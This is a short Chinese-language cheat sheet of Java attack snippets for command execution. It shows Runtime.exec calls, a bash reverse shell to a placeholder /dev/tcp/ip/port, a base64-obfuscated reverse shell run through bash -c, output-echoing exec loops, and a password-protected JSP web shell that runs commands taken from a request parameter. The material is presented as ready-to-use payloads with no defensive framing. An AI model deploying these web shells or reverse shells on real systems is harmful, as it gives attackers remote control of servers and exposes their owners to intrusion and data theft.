命令执行
```
java.lang.Runtime.getRuntime().exec("calc");

Runtime runtime = Runtime.getRuntime();
runtime.exec("calc");
```
注意java这里反弹shell需要改良
```
Runtime.getRuntime().exec("bash -i >& /dev/tcp/ip/port 0>&1");

bash -i >& /dev/tcp/ip/port 0>&1 需要base64编码再执行下面：

bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}
```

有回显命令执行
```
java.io.InputStream in = Runtime.getRuntime().exec("ipconfig").getInputStream();
int a = -1;
byte[] b = new byte[2048];
while((a=in.read(b))!=-1){
    System.out.println(new String(b));
}
```
jsp回显命令执行：
```
<% if("x".equals(request.getParameter("pwd"))){
    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    out.print("<pre>");
    while((a=in.read(b))!=-1){
        out.println(new String(b));
    }
    out.print("</pre>");
} %>
```
linux系统的命令执行：
```
new java.lang.ProcessBuilder("/bin/bash","-c","ip").start();

new java.lang.ProcessBuilder("cmd.exe","/c","calc").start();

-c：运行完这个命令，关闭命令提示符，不在等待执行写一个命令。
```
